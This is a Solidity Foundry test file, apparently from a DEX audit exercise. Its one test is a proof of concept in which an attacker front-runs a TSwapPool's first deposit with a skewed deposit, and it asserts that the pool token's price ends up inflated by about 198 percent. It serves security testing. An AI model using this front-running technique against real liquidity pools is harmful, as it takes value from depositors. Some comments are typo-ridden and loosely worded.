// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { TSwapPool } from "../../src/PoolFactory.sol";
import { ERC20Mock } from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import { IERC20 } from "@openzeppelin/contracts/interfaces/IERC20.sol";

contract TSwapPoolTest is Test {
    TSwapPool pool;
    ERC20Mock poolToken;
    ERC20Mock weth;

    address liquidityProvider = makeAddr("liquidityProvider");
    address user = makeAddr("user");
    address attacker = makeAddr("attacker");

    function setUp() public {
        poolToken = new ERC20Mock();
        weth = new ERC20Mock();
        pool = new TSwapPool(address(poolToken), address(weth), "LTokenA", "LA");

        weth.mint(liquidityProvider, 200e18);
        poolToken.mint(liquidityProvider, 200e18);

        weth.mint(user, 200e18);
        poolToken.mint(user, 200e18);

        weth.mint(attacker, 200e18);
        poolToken.mint(attacker, 200e18);
    }

    function testInflatePoolTokenFrontrun() public {
        // attacker front run the initial deposit
        vm.startPrank(attacker);
        weth.approve(address(pool), 200e18);
        poolToken.approve(address(pool), 200e18);

        // deposit low amount of poolToken, to bring the value of pookToken high
        pool.deposit(100e18, 0, 1, uint64(block.timestamp));

        // initial liquidit provider is now trying to deposit
        vm.startPrank(liquidityProvider);
        weth.approve(address(pool), 100e18);
        poolToken.approve(address(pool), 100e18);
        pool.deposit(100e18, 100e18, 100e18, uint64(block.timestamp));


        // price of toolToken is `~200e18` instead of `~1e18`
        // which is 200% heigher
        console.log(pool.getPriceOfOnePoolTokenInWeth());

        uint poolTokenPrice = pool.getPriceOfOnePoolTokenInWeth();
        uint priceDiff = poolTokenPrice - 1e18;
        uint priceAvg = (poolTokenPrice + 1e18) / 2;
        uint pricePercentDiff = (priceDiff * 100) / priceAvg; // ~200
        console.log(pricePercentDiff); // 198

        uint pricePercentDiffTolerance = 5;
        assertGt(pricePercentDiff, 200 - pricePercentDiffTolerance);
    }
}
